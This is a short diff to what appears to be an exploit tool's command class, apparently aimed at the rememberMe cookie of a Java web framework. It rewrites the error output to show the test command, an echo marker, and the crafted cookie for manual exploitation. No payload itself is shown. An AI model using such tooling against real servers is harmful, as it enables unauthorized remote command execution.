@@ -226,9 +226,10 @@ class Exploit(Command):
                         print (i.decode().replace(checker,""))
                         break
                     elif regex.findall(rsp.text) == []:
-                        print ("Something error: ")
-                        print ("Exploit Manual: ")
-                        print ("Testcmd: whoami")
+                        print ("[!] Something error!")
+                        print ("[!] Exploit Manual: ")
+                        print ("Testcmd: {}".format(self.command))
+                        print("Testecho: {}".format(checker))
                         print ("Cookie: rememberMe={}".format(payload))
                         break
                     else:
